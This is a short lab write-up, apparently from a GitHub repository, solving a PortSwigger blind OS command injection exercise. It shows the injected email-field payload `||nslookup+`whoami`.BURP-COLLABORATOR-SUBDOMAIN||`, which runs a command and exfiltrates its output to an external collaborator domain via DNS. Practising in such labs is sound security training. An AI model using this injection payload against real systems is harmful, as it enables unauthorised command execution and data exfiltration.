This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab

### Solution

captured the feedback POST request and modified the email with the payload `||nslookup+``whoami``.BURP-COLLABORATOR-SUBDOMAIN||`

then inserted the burp collaborator payload for the subdomain

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/cfc79693-a7b3-4e25-83e4-08f07bfe4312)

At the collaborator tab, the current user name was identified succesfully

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0ac5a211-1b99-498c-b44f-6083c15ced6d)

Submitted the soultion and completed the lab succesfully

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/6e15be3f-a669-42a6-bf52-96fc37cd5507)
